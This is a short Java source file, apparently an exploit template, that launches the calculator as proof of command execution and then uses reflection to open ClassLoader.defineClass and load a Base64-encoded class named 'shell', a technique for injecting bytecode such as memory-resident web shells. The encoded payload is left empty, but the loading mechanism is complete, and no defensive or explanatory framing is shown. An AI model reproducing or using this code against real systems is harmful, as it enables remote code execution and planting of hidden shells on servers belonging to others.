import java.io.IOException;
import java.lang.reflect.InvocationTargetException;

public class Calc {
    public static void _main(String[] args) throws IOException, NoSuchMethodException, InvocationTargetException, IllegalAccessException, InstantiationException {
        Runtime.getRuntime().exec("calc");
        ClassLoader classLoader = ClassLoader.getSystemClassLoader();
        java.lang.reflect.Method dc = ClassLoader.class.getDeclaredMethod("defineClass", String.class, byte[].class, int.class, int.class);
        dc.setAccessible(true);
        byte[] code = java.util.Base64.getDecoder().decode("");
        Class c = (Class) dc.invoke(classLoader, "shell", code, 0, code.length);
        c.newInstance();
    }
}
